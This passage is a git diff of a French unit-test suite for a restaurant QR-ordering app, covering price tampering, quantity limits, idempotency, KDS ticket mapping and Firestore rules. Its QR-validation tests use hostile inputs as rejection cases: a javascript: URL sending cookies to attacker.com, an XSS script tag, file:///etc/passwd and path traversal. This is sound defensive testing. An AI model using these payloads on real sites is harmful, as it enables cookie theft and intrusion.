@@ -1,12 +1,12 @@
 /**
- * RESTAUMAX — Tests unitaires et d'intégration en mémoire pour le LOT 2
+ * RESTAUMAX — Tests unitaires et d'intégration automatisés pour le LOT 2
  *
- * Ce fichier teste rigoureusement le parcours client et le générateur QR :
- * - Section 1 : Calculs stricts de tarification en FCFA (prix unitaires, options, extras, totaux)
- * - Section 2 : Validation d'intégrité de la commande (catalogue de confiance, disponibilité, table)
- * - Section 3 : Sécurité et encodage du générateur QR et du scanner (URL canoniques, rejet injections)
- * - Section 4 : Déduplication et signatures des configurations du panier
- * - Section 5 : Simulation de la persistance Firestore de la commande et protection anti-doublon
+ * Vérifie rigoureusement les 6 corrections du Lot 2 :
+ * - CORRECTION A : Intégrité des prix, validation stricte et protection anti-doublon
+ * - CORRECTION B : Validation stricte des entrées QR et rejet des tiers/schémas malveillants
+ * - CORRECTION C : Transmission KDS persistante, correspondance de statut et déduplication
+ * - CORRECTION D : Règles de sécurité Firestore multitenant et restriction des modifications
+ * - CORRECTION E : Gestion exclusive des tables réelles sans données factices de repli
  */
 
 import { 
@@ -14,7 +14,9 @@ import {
   calculateOrderTotal, 
   validateAndBuildOrder,
   generateTableQrUrl,
-  parseAndValidateQrInput
+  parseAndValidateQrInput,
+  sanitizeNote,
+  clearOrderSubmissionCache
 } from '../src/utils/pricing.js';
 
 import {
@@ -22,6 +24,10 @@ import {
   getNormalizedExtrasSignature,
   areCartConfigurationsEqual
 } from '../src/components/restaumax/ClientMenuView.js';
+
+import { mapRestauOrderToKitchenTicket } from '../src/App.js';
+import fs from 'node:fs';
+import path from 'node:path';
 
 let totalTests = 0;
 let passedTests = 0;
@@ -40,10 +46,10 @@ function assert(condition, message) {
 
 async function runTests() {
   console.log('====================================================');
-  console.log('RESTAUMAX — EXÉCUTION DE LA SUITE DE TESTS DU LOT 2');
+  console.log('RESTAUMAX — VALIDATION COMPLÈTE DU LOT 2');
   console.log('====================================================\n');
 
-  // Catalogue de test fiable inspiré de Chez Awa
+  // Catalogue de test complet Chez Awa avec groupes d'options et extras réels
   const mockCatalog = [
     {
       id: 'dish-capitaine',
@@ -54,7 +60,23 @@ async function runTests() {
       description: 'Poisson capitaine entier',
       imageUrl: 'https://example.com/capitaine.jpg',
       available: true,
-      prepTimeMinutes: 20
+      prepTimeMinutes: 20,
+      optionGroups: [
+        {
+          id: 'grp-acc',
+          name: 'Choix d’accompagnement',
+          required: true,
+          options: [
+            { id: 'opt-attieke', name: 'Attiéké de Grand-Bassam', extraPrice: 0, isDefault: true },
+            { id: 'opt-alloco', name: 'Alloco Banane Plantain', extraPrice: 500 },
+            { id: 'opt-riz', name: 'Riz Blanc Parfumé', extraPrice: 0 }
+          ]
+        }
+      ],
+      availableExtras: [
+        { id: 'ext-piment', name: 'Sauce piment maison', price: 300 },
+        { id: 'ext-oignons', name: 'Double oignons braisés', price: 400 }
+      ]
     },
     {
       id: 'dish-poulet',
@@ -65,18 +87,22 @@ async function runTests() {
       description: 'Poulet fermier',
       imageUrl: 'https://example.com/poulet.jpg',
       available: true,
-      prepTimeMinutes: 15
+      prepTimeMinutes: 15,
+      optionGroups: [],
+      availableExtras: [
+        { id: 'ext-piment', name: 'Sauce piment maison', price: 300 }
+      ]
     },
     {
-      id: 'dish-alloco',
-      restaurantSlug: 'chez-awa',
-      name: 'Portion Généreuse d’Alloco Plantain',
-      category: 'accompagnements',
-      price: 2500,
-      description: 'Alloco doré',
-      imageUrl: 'https://example.com/alloco.jpg',
+      id: 'dish-autre-resto',
+      restaurantSlug: 'le-safari', // Appartient à un autre restaurant
+      name: 'Burger Safari',
+      category: 'plats',
+      price: 6000,
+      description: 'Burger du Safari',
+      imageUrl: '',
       available: true,
-      prepTimeMinutes: 5
+      prepTimeMinutes: 10
     },
     {
       id: 'dish-rupture',
@@ -91,277 +117,372 @@ async function runTests() {
     }
   ];
 
-  // ==========================================================================
-  // SECTION 1 : Calculs de tarification en FCFA
-  // ==========================================================================
-  console.log('--- SECTION 1 : Tarification et calculs en FCFA ---');
-
-  // Test 1.1: Plat seul sans options ni extras
-  const p1 = calculateItemUnitPrice(14500);
-  assert(p1 === 14500, `Prix de base plat seul : ${p1} FCFA (attendu: 14500)`);
-
-  // Test 1.2: Plat avec option incluse (extraPrice = 0)
-  const p2 = calculateItemUnitPrice(14500, { extraPrice: 0 });
-  assert(p2 === 14500, `Option incluse sans surcoût : ${p2} FCFA`);
-
-  // Test 1.3: Plat avec option payante (ex. Alloco +500 FCFA)
-  const p3 = calculateItemUnitPrice(14500, { extraPrice: 500 });
-  assert(p3 === 15000, `Option payante Alloco (+500) : ${p3} FCFA (attendu: 15000)`);
-
-  // Test 1.4: Plat avec plusieurs extras
-  const p4 = calculateItemUnitPrice(14500, { extraPrice: 500 }, [
-    { price: 300 }, // Sauce piment
-    { price: 400 }  // Oignons braisés
-  ]);
-  assert(p4 === 15700, `Plat + option (+500) + extras (+700) : ${p4} FCFA (attendu: 15700)`);
-
-  // Test 1.5: Total de commande avec plusieurs articles et quantités
-  const orderLines = [
-    { unitPrice: 15000, quantity: 2 }, // 30 000
-    { unitPrice: 2500, quantity: 3 }   // 7 500
+  const mockRealTables = [
+    { id: 'tbl-1', tableNumber: '1', section: 'salle', capacity: 2, isActive: true },
+    { id: 'tbl-4', tableNumber: '4', section: 'salle', capacity: 4, isActive: true },
+    { id: 'tbl-5', tableNumber: '5', section: 'terrasse', capacity: 4, isActive: false } // Inactive
   ];
-  const grandTotal = calculateOrderTotal(orderLines);
-  assert(grandTotal === 37500, `Sous-total commande multi-lignes : ${grandTotal} FCFA (attendu: 37500)`);
-
-  // Test 1.6: Tolérance aux valeurs non numériques ou négatives
-  const safeTotal = calculateOrderTotal([
-    { unitPrice: -500, quantity: 2 },
-    { unitPrice: 1000, quantity: -3 }
-  ]);
-  assert(safeTotal === 1000, `Normalise les négatifs à des valeurs saines : ${safeTotal} FCFA`);
 
   // ==========================================================================
-  // SECTION 2 : Validation stricte et intégrité de la commande
+  // SECTION 1 : CORRECTION A — Intégrité des prix et validation de commande
   // ==========================================================================
-  console.log('\n--- SECTION 2 : Validation d\'intégrité de la commande ---');
+  console.log('--- SECTION 1 : CORRECTION A — Intégrité des prix & Validation ---');
 
-  // Test 2.1: Rejet d'un panier vide
-  const resEmpty = validateAndBuildOrder({
-    cart: [],
-    catalog: mockCatalog,
-    restaurantSlug: 'chez-awa',
-    orderMode: 'sur_place',
-    tableNumber: '4'
-  });
-  assert(resEmpty.success === false, 'Rejette un panier vide');
-
-  // Test 2.2: Rejet commande sur place sans numéro de table
-  const resNoTable = validateAndBuildOrder({
-    cart: [{ menuItemId: 'dish-capitaine', name: 'Capitaine', basePrice: 14500, unitPrice: 14500, quantity: 1, selectedExtras: [], imageUrl: '' }],
-    catalog: mockCatalog,
-    restaurantSlug: 'chez-awa',
-    orderMode: 'sur_place',
-    tableNumber: null
-  });
-  assert(resNoTable.success === false, 'Rejette une commande sur place sans table');
-
-  // Test 2.3: Rejet commande sur place avec table vide d'espaces
-  const resWhitespaceTable = validateAndBuildOrder({
-    cart: [{ menuItemId: 'dish-capitaine', name: 'Capitaine', basePrice: 14500, unitPrice: 14500, quantity: 1, selectedExtras: [], imageUrl: '' }],
-    catalog: mockCatalog,
-    restaurantSlug: 'chez-awa',
-    orderMode: 'sur_place',
-    tableNumber: '   '
-  });
-  assert(resWhitespaceTable.success === false, 'Rejette une table composée uniquement d\'espaces');
-
-  // Test 2.4: Commande à emporter valide sans table
-  const resTakeaway = validateAndBuildOrder({
-    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
-    catalog: mockCatalog,
-    restaurantSlug: 'chez-awa',
-    orderMode: 'a_emporter',
-    tableNumber: null
-  });
-  assert(resTakeaway.success === true, 'Valide une commande à emporter sans table');
-  assert(resTakeaway.order?.orderMode === 'a_emporter', 'Le mode de commande est bien "a_emporter"');
-  assert(resTakeaway.order?.tableNumber === null, 'Le numéro de table est bien null pour l\'emporter');
-
-  // Test 2.5: Rejet formel d'un plat en rupture de stock (available: false)
-  const resUnavailable = validateAndBuildOrder({
-    cart: [{ menuItemId: 'dish-rupture', name: 'Langouste', basePrice: 25000, unitPrice: 25000, quantity: 1, selectedExtras: [], imageUrl: '' }],
-    catalog: mockCatalog,
-    restaurantSlug: 'chez-awa',
-    orderMode: 'sur_place',
-    tableNumber: '4'
-  });
-  assert(resUnavailable.success === false, 'Rejette formellement un plat en rupture');
-  assert(resUnavailable.error?.includes('rupture'), 'L\'erreur mentionne la rupture de stock');
-
-  // Test 2.6: Rejet d'un plat non présent au catalogue
-  const resUnknown = validateAndBuildOrder({
-    cart: [{ menuItemId: 'dish-fantome-inexistant', name: 'Plat Fantôme', basePrice: 5000, unitPrice: 5000, quantity: 1, selectedExtras: [], imageUrl: '' }],
-    catalog: mockCatalog,
-    restaurantSlug: 'chez-awa',
-    orderMode: 'sur_place',
-    tableNumber: '4'
-  });
-  assert(resUnknown.success === false, 'Rejette un plat supprimé ou absent du catalogue');
-
-  // Test 2.7: Recalcul des prix depuis le catalogue de confiance (anti-falsification client)
-  const resTamperedPrice = validateAndBuildOrder({
+  // Test 1.1: Rejet d'un plat appartenant à un autre restaurant
+  const resCrossTenant = validateAndBuildOrder({
     cart: [{
-      menuItemId: 'dish-capitaine',
-      name: 'Capitaine Braisé au Feu de Bois',
-      basePrice: 10, // Prix client falsifié malveillant
-      unitPrice: 10,
-      quantity: 2,
-      selectedOption: { groupId: 'acc', groupName: 'Acc', optionId: 'alloco', optionName: 'Alloco', extraPrice: 500 },
+      menuItemId: 'dish-autre-resto',
+      name: 'Burger Safari',
+      basePrice: 6000,
+      unitPrice: 6000,
+      quantity: 1,
       selectedExtras: [],
       imageUrl: ''
     }],
     catalog: mockCatalog,
     restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resCrossTenant.success === false, 'Rejette un plat appartenant à un autre restaurant (anti cross-tenant)');
+
+  // Test 1.2: Rejet d'un plat en rupture de stock (available: false)
+  const resRupture = validateAndBuildOrder({
+    cart: [{
+      menuItemId: 'dish-rupture',
+      name: 'Langouste',
+      basePrice: 25000,
+      unitPrice: 25000,
+      quantity: 1,
+      selectedExtras: [],
+      imageUrl: ''
+    }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resRupture.success === false, 'Rejette formellement un plat en rupture');
+
+  // Test 1.3: Exigence d'une option obligatoire
+  const resMissingOption = validateAndBuildOrder({
+    cart: [{
+      menuItemId: 'dish-capitaine',
+      name: 'Capitaine',
+      basePrice: 14500,
+      unitPrice: 14500,
+      quantity: 1,
+      selectedExtras: [],
+      imageUrl: ''
+      // Absence de selectedOption alors que required: true
+    }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resMissingOption.success === false, 'Rejette la commande lorsqu\'une option obligatoire est omise');
+
+  // Test 1.4: Falsification du prix d'une option par le client
+  const resTamperedOption = validateAndBuildOrder({
+    cart: [{
+      menuItemId: 'dish-capitaine',
+      name: 'Capitaine',
+      basePrice: 14500,
+      unitPrice: 14500,
+      quantity: 1,
+      selectedOption: {
+        groupId: 'grp-acc',
+        groupName: 'Choix d’accompagnement',
+        optionId: 'opt-alloco',
+        optionName: 'Alloco Banane Plantain',
+        extraPrice: 0 // Client tente de mettre 0 au lieu des 500 du catalogue
+      },
+      selectedExtras: [],
+      imageUrl: ''
+    }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resTamperedOption.success === true, 'Valide la commande avec option');
+  // Le prix unitaire doit être 14500 + 500 (catalogue) = 15000
+  assert(resTamperedOption.order?.items[0].unitPrice === 15000, `Prix de l'option écrasé par le catalogue (15000 FCFA vs 14500 tenté) : ${resTamperedOption.order?.items[0].unitPrice}`);
+
+  // Test 1.5: Falsification du prix d'un extra par le client
+  const resTamperedExtra = validateAndBuildOrder({
+    cart: [{
+      menuItemId: 'dish-capitaine',
+      name: 'Capitaine',
+      basePrice: 14500,
+      unitPrice: 14500,
+      quantity: 1,
+      selectedOption: {
+        groupId: 'grp-acc',
+        groupName: 'Choix d’accompagnement',
+        optionId: 'opt-attieke',
+        optionName: 'Attiéké',
+        extraPrice: 0
+      },
+      selectedExtras: [
+        { extraId: 'ext-piment', name: 'Sauce piment', price: 10 } // Client tente 10 au lieu de 300
+      ],
+      imageUrl: ''
+    }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resTamperedExtra.success === true, 'Valide la commande avec extra');
+  // 14500 + 0 + 300 = 14800
+  assert(resTamperedExtra.order?.totalAmount === 14800, `Prix de l'extra écrasé par le catalogue (14800 FCFA vs 14510 tenté) : ${resTamperedExtra.order?.totalAmount}`);
+
+  // Test 1.6: Extra non existant au catalogue
+  const resUnknownExtra = validateAndBuildOrder({
+    cart: [{
+      menuItemId: 'dish-capitaine',
+      name: 'Capitaine',
+      basePrice: 14500,
+      unitPrice: 14500,
+      quantity: 1,
+      selectedOption: { groupId: 'grp-acc', groupName: 'Acc', optionId: 'opt-attieke', optionName: 'Attiéké', extraPrice: 0 },
+      selectedExtras: [{ extraId: 'ext-inconnu', name: 'Or en poudre', price: 5000 }],
+      imageUrl: ''
+    }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resUnknownExtra.success === false, 'Rejette un extra non défini au catalogue');
+
+  // Test 1.7: Rejet des quantités invalides (non entières ou hors limites)
+  const resFloatQty = validateAndBuildOrder({
+    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 2.5, selectedExtras: [], imageUrl: '' }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resFloatQty.success === false, 'Rejette une quantité flottante (2.5)');
+
+  const resZeroQty = validateAndBuildOrder({
+    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 0, selectedExtras: [], imageUrl: '' }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resZeroQty.success === false, 'Rejette une quantité égale à zéro');
+
+  const resHugeQty = validateAndBuildOrder({
+    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 51, selectedExtras: [], imageUrl: '' }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'a_emporter',
+    tableNumber: null
+  });
+  assert(resHugeQty.success === false, 'Rejette une quantité dépassant le plafond de 50');
+
+  // Test 1.8: Assainissement et limitation des notes de préparation (max 150 caractères, anti-XSS)
+  const longNote = 'A'.repeat(200);
+  const sanitized = sanitizeNote(`<script>alert('xss')</script>${longNote}`, 150);
+  assert(sanitized !== undefined && sanitized.length <= 150, `Limite la note à 150 caractères : ${sanitized?.length}`);
+  assert(!sanitized?.includes('<script>'), 'Supprime les balises HTML/XSS des notes');
+
+  // Test 1.9: Vérification de la table réelle et rejet de table inexistante ou inactive
+  const resInactiveTable = validateAndBuildOrder({
+    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
     orderMode: 'sur_place',
-    tableNumber: '4'
+    tableNumber: '5', // Table 5 est inactive dans mockRealTables
+    allowedTables: mockRealTables
   });
-  assert(resTamperedPrice.success === true, 'Accepte la commande en appliquant le tarif catalogue');
-  // 14500 (catalogue) + 500 (alloco) = 15000 * 2 = 30000 FCFA
-  assert(resTamperedPrice.order?.totalAmount === 30000, `Prix client falsifié (10) écrasé par le prix de confiance (30000 FCFA) : ${resTamperedPrice.order?.totalAmount}`);
+  assert(resInactiveTable.success === false, 'Rejette une commande sur place sur une table inactive');
 
-  // Test 2.8: Statut initial obligatoire 'pending'
-  assert(resTamperedPrice.order?.status === 'pending', 'Le statut initial est strictement "pending"');
-
-  // Test 2.9: Format du numéro de commande humain (#CMD-XXX)
-  assert(/^#CMD-\d{3,4}$/.test(resTamperedPrice.order?.orderNumber || ''), `Numéro de commande valide : ${resTamperedPrice.order?.orderNumber}`);
-
-  // ==========================================================================
-  // SECTION 3 : Génération et sécurité des QR codes de table
-  // ==========================================================================
-  console.log('\n--- SECTION 3 : Génération et sécurité des QR codes ---');
-
-  // Test 3.1: Génération URL canonique table simple
-  const url1 = generateTableQrUrl('https://restaumax.app', 'chez-awa', '4');
-  assert(url1 === 'https://restaumax.app/r/chez-awa?table=4', `URL canonique table 4 : ${url1}`);
-
-  // Test 3.2: Génération URL canonique avec espaces (ex. "Bar 01")
-  const url2 = generateTableQrUrl('https://restaumax.app', 'chez-awa', 'Bar 01');
-  assert(url2 === 'https://restaumax.app/r/chez-awa?table=Bar%2001', `URL canonique avec encodage URI : ${url2}`);
-
-  // Test 3.3: Parsing URL complète valide
-  const parsed1 = parseAndValidateQrInput('https://chez-awa.restaumax.app/r/chez-awa?table=4');
-  assert(parsed1.isValid === true, 'Valide une URL complète RestauMax');
-  assert(parsed1.tableNumber === '4', `Extrait le numéro de table 4 : ${parsed1.tableNumber}`);
-  assert(parsed1.canonicalPath === '/r/chez-awa?table=4', 'Génère le chemin canonique /r/chez-awa?table=4');
-
-  // Test 3.4: Parsing chemin relatif
-  const parsed2 = parseAndValidateQrInput('/r/chez-awa?table=12');
-  assert(parsed2.isValid === true && parsed2.tableNumber === '12', 'Extrait la table 12 depuis un chemin relatif');
-
-  // Test 3.5: Parsing chaîne brute numéro de table (saisie manuelle ou QR brut)
-  const parsed3 = parseAndValidateQrInput('Terrasse 2');
-  assert(parsed3.isValid === true && parsed3.tableNumber === 'Terrasse 2', 'Supporte la saisie directe d\'un nom de table');
-
-  // Test 3.6: Rejet injection script / XSS dans QR code
-  const parsedMalicious = parseAndValidateQrInput('javascript:alert(document.cookie)');
-  assert(parsedMalicious.tableNumber === null, 'Neutralise les URLs malveillantes javascript:');
-
-  // Test 3.7: Rejet entrée vide
-  const parsedEmpty = parseAndValidateQrInput('');
-  assert(parsedEmpty.isValid === false, 'Rejette une entrée QR vide');
-
-  // ==========================================================================
-  // SECTION 4 : Signatures déterministes et déduplication du panier
-  // ==========================================================================
-  console.log('\n--- SECTION 4 : Déduplication et signatures du panier ---');
-
-  // Test 4.1: Signature d'options
-  const sigOpt1 = getNormalizedOptionSignature({
-    groupId: 'acc',
-    groupName: 'Accompagnement',
-    optionId: 'alloco',
-    optionName: 'Alloco',
-    extraPrice: 500
+  const resUnknownTable = validateAndBuildOrder({
+    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'sur_place',
+    tableNumber: '99', // Inexistante
+    allowedTables: mockRealTables
   });
-  assert(sigOpt1 === 'grp:acc=opt:alloco', `Signature option simple : ${sigOpt1}`);
+  assert(resUnknownTable.success === false, 'Rejette une commande sur place sur une table inexistante');
 
-  // Test 4.2: Signature des extras insensible à l'ordre
-  const extListA = [{ extraId: 'piment', name: 'Piment', price: 200 }, { extraId: 'oignons', name: 'Oignons', price: 400 }];
-  const extListB = [{ extraId: 'oignons', name: 'Oignons', price: 400 }, { extraId: 'piment', name: 'Piment', price: 200 }];
-  const sigExtA = getNormalizedExtrasSignature(extListA);
-  const sigExtB = getNormalizedExtrasSignature(extListB);
-  assert(sigExtA === sigExtB, `Signature des extras triée et indépendante de l'ordre : ${sigExtA}`);
-
-  // Test 4.3: Déduplication de deux articles identiques (doivent fusionner)
-  const itemA = {
-    id: 'line-1',
-    menuItemId: 'dish-capitaine',
-    name: 'Capitaine',
-    basePrice: 14500,
-    unitPrice: 15000,
-    quantity: 1,
-    selectedOption: { groupId: 'acc', groupName: 'Acc', optionId: 'alloco', optionName: 'Alloco', extraPrice: 500 },
-    selectedExtras: extListA,
-    prepNotes: 'Bien cuit',
-    imageUrl: ''
+  // Test 1.10: Protection anti double-soumission (idempotence)
+  clearOrderSubmissionCache();
+  const orderPayload = {
+    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
+    catalog: mockCatalog,
+    restaurantSlug: 'chez-awa',
+    orderMode: 'sur_place',
+    tableNumber: '4',
+    allowedTables: mockRealTables,
+    idempotencyKey: 'idem-test-123'
   };
+  const sub1 = validateAndBuildOrder(orderPayload);
+  assert(sub1.success === true, 'Première soumission acceptée');
 
-  const itemB = {
-    id: 'line-2',
-    menuItemId: 'dish-capitaine',
-    name: 'Capitaine',
-    basePrice: 14500,
-    unitPrice: 15000,
-    quantity: 2,
-    selectedOption: { groupId: 'acc', groupName: 'Acc', optionId: 'alloco', optionName: 'Alloco', extraPrice: 500 },
-    selectedExtras: extListB, // ordre inversé
-    prepNotes: '  Bien cuit  ', // espaces superflus
-    imageUrl: ''
-  };
-
-  assert(areCartConfigurationsEqual(itemA, itemB) === true, 'Reconnaît deux configurations identiques et autorise la fusion des quantités');
-
-  // Test 4.4: Deux articles avec options différentes (ne doivent PAS fusionner)
-  const itemC = {
-    ...itemA,
-    selectedOption: { groupId: 'acc', groupName: 'Acc', optionId: 'attieke', optionName: 'Attiéké', extraPrice: 0 }
-  };
-  assert(areCartConfigurationsEqual(itemA, itemC) === false, 'Distingue deux plats avec accompagnements différents');
-
-  // Test 4.5: Deux articles avec consignes cuisine différentes (ne doivent PAS fusionner)
-  const itemD = {
-    ...itemA,
-    prepNotes: 'Sans piment pour enfant'
-  };
-  assert(areCartConfigurationsEqual(itemA, itemD) === false, 'Distingue deux plats avec consignes de préparation différentes');
+  const sub2 = validateAndBuildOrder(orderPayload);
+  assert(sub2.success === false, 'Seconde soumission immédiate bloquée par l\'idempotence');
 
   // ==========================================================================
-  // SECTION 5 : Simulation de la persistance Firestore de la commande
+  // SECTION 2 : CORRECTION B — Validation stricte des entrées QR
   // ==========================================================================
-  console.log('\n--- SECTION 5 : Simulation de persistance de commande Firestore ---');
+  console.log('\n--- SECTION 2 : CORRECTION B — Sécurité et filtrage QR Scanner ---');
 
-  function createMockFirestoreOrderStore() {
-    const store = new Map();
-    let writeCount = 0;
+  // Test 2.1: Rejet strict des domaines tiers non autorisés
+  const resEvilDomain = parseAndValidateQrInput('https://evil-phishing.com/r/chez-awa?table=4', {
+    defaultSlug: 'chez-awa',
+    allowedOrigins: ['https://restaumax.app']
+  });
+  assert(resEvilDomain.isValid === false, 'Rejette un domaine tiers non autorisé même si le chemin est /r/chez-awa');
 
-    return {
-      store,
-      getWriteCount: () => writeCount,
-      async setOrder(path, order) {
-        writeCount++;
-        store.set(path, JSON.parse(JSON.stringify(order)));
+  // Test 2.2: Rejet des schémas interdits (javascript:, data:, file:)
+  const resJsScheme = parseAndValidateQrInput('javascript:fetch("https://attacker.com/"+document.cookie)');
+  assert(resJsScheme.isValid === false, 'Rejette formellement le protocole javascript:');
+
+  const resDataScheme = parseAndValidateQrInput('data:text/html,<script>evil()</script>');
+  assert(resDataScheme.isValid === false, 'Rejette formellement le protocole data:');
+
+  const resFileScheme = parseAndValidateQrInput('file:///etc/passwd');
+  assert(resFileScheme.isValid === false, 'Rejette formellement le protocole file:');
+
+  // Test 2.3: Rejet des identifiants dans l'URL (credentials)
+  const resCredentials = parseAndValidateQrInput('https://admin:secret@restaumax.app/r/chez-awa?table=4', {
+    allowedOrigins: ['https://restaumax.app']
+  });
+  assert(resCredentials.isValid === false, 'Rejette une URL contenant des identifiants d\'authentification');
+
+  // Test 2.4: Rejet des chemins arbitraires non autorisés
+  const resAdminPath = parseAndValidateQrInput('/gestion/settings');
+  assert(resAdminPath.isValid === false, 'Rejette un chemin hors périmètre (/gestion/settings)');
+
+  const resTraversePath = parseAndValidateQrInput('/r/chez-awa/../../admin');
+  assert(resTraversePath.isValid === false, 'Rejette les tentatives de path traversal');
+
+  // Test 2.5: Validation du numéro de table (longueur et caractères)
+  const resBadTableChars = parseAndValidateQrInput('/r/chez-awa?table=<script>');
+  assert(resBadTableChars.isValid === false, 'Rejette un numéro de table avec balises script');
+
+  const resTooLongTable = parseAndValidateQrInput('/r/chez-awa?table=' + 'A'.repeat(25));
+  assert(resTooLongTable.isValid === false, 'Rejette un identifiant de table supérieur à 20 caractères');
+
+  // Test 2.6: URL valide relative et absolue sur domaine autorisé
+  const resValidRelative = parseAndValidateQrInput('/r/chez-awa?table=4');
+  assert(resValidRelative.isValid === true && resValidRelative.tableNumber === '4', 'Accepte une URL relative valide /r/chez-awa?table=4');
+
+  const resValidAbsolute = parseAndValidateQrInput('https://restaumax.app/r/chez-awa?table=Terrasse%20B', {
+    allowedOrigins: ['https://restaumax.app']
+  });
+  assert(resValidAbsolute.isValid === true && resValidAbsolute.tableNumber === 'Terrasse B', 'Accepte une URL absolue sur domaine autorisé avec espace encodé');
+
+  // ==========================================================================
+  // SECTION 3 : CORRECTION C — Transmission KDS persistante et déduplication
+  // ==========================================================================
+  console.log('\n--- SECTION 3 : CORRECTION C — KDS Persistant & Correspondance des statuts ---');
+
+  const mockOrder = {
+    id: 'ord-test-kds-1',
+    orderNumber: '#CMD-742',
+    restaurantSlug: 'chez-awa',
+    orderMode: 'sur_place',
+    tableNumber: '4',
+    items: [
+      {
+        id: 'line-1',
+        menuItemId: 'dish-capitaine',
+        name: 'Capitaine Braisé au Feu de Bois',
+        basePrice: 14500,
+        unitPrice: 15000,
+        quantity: 2,
+        totalPrice: 30000,
+        selectedOption: {
+          groupId: 'grp-acc',
+          groupName: 'Accompagnement',
+          optionId: 'opt-alloco',
+          optionName: 'Alloco Banane Plantain',
+          extraPrice: 500
+        },
+        selectedExtras: [
+          { extraId: 'ext-piment', name: 'Sauce piment maison', price: 300 }
+        ],
+        prepNotes: 'Bien pimenté'
       }
-    };
-  }
+    ],
+    itemsCount: 2,
+    totalAmount: 30600,
+    currency: 'FCFA',
+    status: 'pending',
+    createdAt: Date.now(),
+    createdAtIso: new Date().toISOString()
+  };
 
-  const mockFs = createMockFirestoreOrderStore();
-  const validOrder = resTamperedPrice.order;
+  // Test 3.1: Mapping stable d'un ordre Firestore vers un ticket KDS
+  const ticket1 = mapRestauOrderToKitchenTicket(mockOrder);
+  assert(ticket1.id === 'ord-ord-test-kds-1', `ID du ticket KDS stable : ${ticket1.id}`);
+  assert(ticket1.ticketNumber === '#CMD-742', 'Numéro de commande KDS exact');
+  assert(ticket1.tableNumber === 'Table 4', 'Emplacement table correctement formatté');
+  assert(ticket1.status === 'in_prep', 'Statut "pending" mappé vers "in_prep" pour la cuisine');
+  assert(ticket1.items[0].name === 'Capitaine Braisé au Feu de Bois', 'Ligne plat préservée');
+  assert(ticket1.items[0].notes.includes('Alloco'), 'Notes d\'options incluses dans le ticket KDS');
 
-  // Test 5.1: Enregistrement d'une commande
-  await mockFs.setOrder(`restaurants/chez-awa/orders/${validOrder.id}`, validOrder);
-  assert(mockFs.store.has(`restaurants/chez-awa/orders/${validOrder.id}`), 'La commande est bien persistée dans Firestore');
-  assert(mockFs.getWriteCount() === 1, 'Une seule écriture déclenchée');
+  // Test 3.2: Mapping avec statut 'ready' et 'completed'
+  const ticketReady = mapRestauOrderToKitchenTicket({ ...mockOrder, status: 'ready' });
+  assert(ticketReady.status === 'ready', 'Statut "ready" correctement préservé pour le KDS');
 
-  const retrieved = mockFs.store.get(`restaurants/chez-awa/orders/${validOrder.id}`);
-  assert(retrieved.status === 'pending', 'Le statut enregistré est "pending"');
-  assert(retrieved.totalAmount === 30000, `Le montant enregistré est exact : ${retrieved.totalAmount} FCFA`);
-  assert(retrieved.tableNumber === '4', `Le numéro de table enregistré est 4 : ${retrieved.tableNumber}`);
+  const ticketCompleted = mapRestauOrderToKitchenTicket({ ...mockOrder, status: 'completed' });
+  assert(ticketCompleted.status === 'served', 'Statut "completed" mappé vers "served" pour le KDS');
+
+  // Test 3.3: Préservation de l'état des items cochés en cuisine lors des mises à jour du flux
+  const ticketWithCompletedItem = {
+    ...ticket1,
+    items: ticket1.items.map(i => ({ ...i, completed: true }))
+  };
+  const updatedFromFirestore = mapRestauOrderToKitchenTicket(mockOrder, ticketWithCompletedItem);
+  assert(updatedFromFirestore.items[0].completed === true, 'Préserve l\'état coché des plats lors d\'un re-render ou snapshot Firestore');
+
+  // ==========================================================================
+  // SECTION 4 : CORRECTION D — Vérification structurelle des règles Firestore
+  // ==========================================================================
+  console.log('\n--- SECTION 4 : CORRECTION D — Sécurisation Firestore Multi-tenant ---');
+
+  const rulesContent = fs.readFileSync(path.resolve('firestore.rules'), 'utf-8');
+
+  // Test 4.1: Vérification de la fonction scoped isManagerOfRestaurant
+  assert(rulesContent.includes('isManagerOfRestaurant(targetSlug)'), 'Définit la fonction de vérification avec portée restaurant (isManagerOfRestaurant)');
+
+  // Test 4.2: Protection multi-tenant sur restaurants et sous-collections
+  assert(rulesContent.includes('allow create: if isManagerOfRestaurant(restaurantSlug)'), 'Écritures restaurants restreintes au gérant autorisé');
+  assert(rulesContent.includes('allow list: if isManagerOfRestaurant(restaurantSlug);'), 'Liste des commandes privée et réservée au gérant du restaurant');
+
